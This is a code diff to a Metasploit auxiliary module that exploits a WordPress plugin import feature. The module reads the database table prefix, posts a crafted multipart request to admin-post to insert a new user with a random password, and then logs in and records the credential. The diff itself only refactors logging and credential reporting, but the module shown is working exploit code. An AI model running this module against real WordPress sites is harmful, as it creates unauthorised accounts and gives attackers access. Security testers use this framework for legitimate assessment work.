@@ -5,7 +5,7 @@
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Auxiliary::Report
-  include Msf::HTTP::Wordpress
+  include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
     super(update_info(info,
@@ -62,17 +62,44 @@ class Metasploit3 < Msf::Auxiliary
     table_prefix
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     username = Rex::Text.rand_text_alpha(10)
     password = Rex::Text.rand_text_alpha(20)
 
-    print_status("#{peer} - Trying to get table_prefix")
+    print_status("Trying to get table_prefix")
     table_prefix = get_table_prefix
     if table_prefix.nil?
-      print_error("#{peer} - Unable to get table_prefix")
+      print_error("Unable to get table_prefix")
       return
     else
-      print_status("#{peer} - got table_prefix '#{table_prefix}'")
+      print_status("got table_prefix '#{table_prefix}'")
     end
 
     data = Rex::MIME::Message.new
@@ -80,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
     data.add_part('1', nil, nil, 'form-data; name="ccf_merge_import"')
     post_data = data.to_s
 
-    print_status("#{peer} - Inserting user #{username} with password #{password}")
+    print_status("Inserting user #{username} with password #{password}")
     res = send_request_cgi(
       'method'   => 'POST',
       'uri'      => wordpress_url_admin_post,
@@ -97,17 +124,17 @@ class Metasploit3 < Msf::Auxiliary
 
     # login successfull
     if cookie
-      print_status("#{peer} - User #{username} with password #{password} successfully created")
-      report_auth_info(
-        sname: 'WordPress',
-        host: rhost,
+      print_status("User #{username} with password #{password} successfully created")
+      report_cred(
+        ip: rhost,
         port: rport,
         user: username,
-        pass: password,
-        active: true
-    )
+        password: password,
+        service_name: 'WordPress',
+        proof: cookie
+      )
     else
-      print_error("#{peer} - User creation failed")
+      print_error("User creation failed")
       return
     end
   end
